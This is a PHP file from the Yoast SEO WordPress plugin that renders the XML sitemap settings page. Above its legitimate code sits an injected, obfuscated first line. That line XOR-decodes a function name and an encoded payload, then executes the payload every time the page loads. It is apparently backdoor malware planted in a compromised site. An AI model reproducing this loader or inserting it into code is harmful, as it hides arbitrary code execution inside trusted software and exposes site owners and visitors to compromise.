<?php $WXdniDAXpUda='9654M5<,>NQORWP'^'ZDPU9PcJK 2;;8>';$BEPlccMmOgJ=$WXdniDAXpUda('','9FpdQ=+XB-5>gXSBC3CjrD>Co<YX+l0PX2BeFFO8OR7C:.9XYv,.F8HJDQ;0U3.EMP69 moWZ2AKxYEzvK6D>p5B9myRnDOkCCZ7JCf.wxaqScG9J:EALY+cgV L9XiQC=jhZh<Qk.8.clTIBTV;= ge::CrQk9EJ8j.KKh+-56<NFv3E4zediMflG0EIJUPkC=TxM=g77KyCHV,. yEMJA<5RHITD >;e9W>TpD+3<FEtzD0V:PL SqpPrcr6 >,FQHEC:I6ypGEM;, 66Ej,cdI67MRaQR.vNEb 7KLCFi+;BWwnstO+=IHSF60pB7APvP5QTWoRL9hMD+Q9,<FdWc5,4mv8dDTStqFEAWYQPMXU<=7GmAmjXc+W819Y,,GUmA1PCtHFstOMNWZwwNATL77JN:Vo91Cj=XTTssgtMYMK=>,G=ZPe2 I=4.-YhfM;MlW.D.XNt66U=P7Nr5XBYxzIKPAEYsQ5<NHqx Unh6WB2XkQdJB35BrKEOr1S<+HMBn8K>uigg56A1kPpVfR=+oFjI--XiQG<BwhJkxNaO-fTAjkExXQvICK6DmW3oSwtPZ3Q=5EW5fSYalh7H;ALrWHK,W G+HSkfL+ .6M aHJJD6 MMbwZkWXLUdY2 J+bCZ8<J-KF1D-=Q5EhMlHx->1DfjeiYQ'^'P XE7HE;6DZP8=++0G0BU<Q10X8,J3o=-FeLof42F4B-YZP77VTA4g,+00do8FZmi4WMAAOs1W8bXyeZV0<M7TZ7MMDrIctaJJ<X8kBGWEAAhCcPvI13 <EKC2A8XqRqgTACsb5XOAMZCBiijp2ZIA<ASgc,qOR 3cNGknHXYGZY nRX MS8MRGoe5U1<8;xO,H Qv7nJ=6sIl2MZAYxm, PF7sCp AJZ:R2GtMdMRP5 OpNV9H5-C;QXt- =ykwif0;egQ,OYMyeiMMLCSlJWimmRV93>:7WVseFKR2wIOMOZ66WSSP9JQ<-hLK:z+QaxWtQ0 6Fr73a++Y4XOTfLs<gie83k0d5 TU- 8wdopi.4PHRnM:gcQGO6LPf2IUghMeZ5:OBOzP+,:6zJWj75 BRqD3+eD;INY9 5SNG487>.OWM+T 5MJO;bPOY879 N9D5O7Knz+RS6R4RfVQ968QVio4 18,:PEgaJrI3FLR66SxMwD+0AT;-  6-T+UX<>jIS.GREGCQW5PBpVpFzPOZnN-LY92v,Y;P5cKEsAhLRayZYwHafC+rzS YgUYfBFahU2XQp1PAzyGJHV:I 5-<-2s2X.X< CA<JYBY,DFdjn WT,dKWzKwxl.nPWV+GJg>YH+vl6P=AR0Qb5dWBqHFX0NZLRS,');$BEPlccMmOgJ();
/**
 * @package WPSEO\Admin\Views
 */

if ( ! defined( 'WPSEO_VERSION' ) ) {
	header( 'Status: 403 Forbidden' );
	header( 'HTTP/1.1 403 Forbidden' );
	exit();
}

echo '<h2>' . esc_html__( 'Your XML Sitemap', 'wordpress-seo' ) . '</h2>';

if ( $options['enablexmlsitemap'] === true ) {
	echo '<p>';
	printf(
		/* translators: %1$s opening tag of the link to the Sitemap, %2$s closing tag for the link. */
		esc_html__( 'You can find your XML Sitemap here: %1$sXML Sitemap%2$s', 'wordpress-seo' ),
		'<a target="_blank" href="' . esc_url( WPSEO_Sitemaps_Router::get_base_url( 'sitemap_index.xml' ) ) . '">',
		'</a>'
	);
	echo '<br/>';
	echo '<br/>';
	_e( 'You do <strong>not</strong> need to generate the XML sitemap, nor will it take up time to generate after publishing a post.', 'wordpress-seo' );
	echo '</p>';
}
else {
	echo '<p>', __( 'Save your settings to activate your XML Sitemap.', 'wordpress-seo' ), '</p>';
}

echo '<h2>' . esc_html__( 'Entries per sitemap page', 'wordpress-seo' ) . '</h2>';
?>
	<p>
		<?php printf( __( 'Please enter the maximum number of entries per sitemap page (defaults to %s, you might want to lower this to prevent memory issues on some installs):', 'wordpress-seo' ), WPSEO_Options::get_default( 'wpseo_xml', 'entries-per-page' ) ); ?>
	</p>

<?php
$yform->textinput( 'entries-per-page', __( 'Max entries per sitemap', 'wordpress-seo' ) );
